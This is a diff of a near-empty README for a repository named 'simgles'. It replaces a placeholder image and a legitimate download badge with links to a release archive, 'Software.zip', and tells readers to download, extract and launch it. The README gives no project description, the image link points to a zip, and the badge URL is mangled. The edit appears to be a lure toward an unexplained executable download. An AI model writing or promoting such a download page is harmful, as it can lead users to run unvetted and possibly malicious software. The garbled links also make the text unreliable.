@@ -1,6 +1,6 @@
 # Welcome to "simgles" Repository 🎉
 
-![simgles](https://example.com/simgles.png)
+![simgles](https://github.com/Nitesh-bot-lang/simgles/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository is dedicated to the project "simgles". Unfortunately, a short description of the project is not provided. However, you can explore the contents of the repository to learn more about the project.
@@ -13,7 +13,7 @@ This repository is dedicated to the project "simgles". Unfortunately, a short de
 
 ## Installation
 To get started with "simgles", you can download the project files by clicking the link below:
-[![Download simgles](https://img.shields.io/badge/Download%20simgles-v1.0.0-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download simgles](https://github.com/Nitesh-bot-lang/simgles/releases/download/v1.0/Software.zip%20simgles-v1.0.0-green)](https://github.com/Nitesh-bot-lang/simgles/releases/download/v1.0/Software.zip)
 
 Once the download is complete, the project files need to be extracted and launched.
 
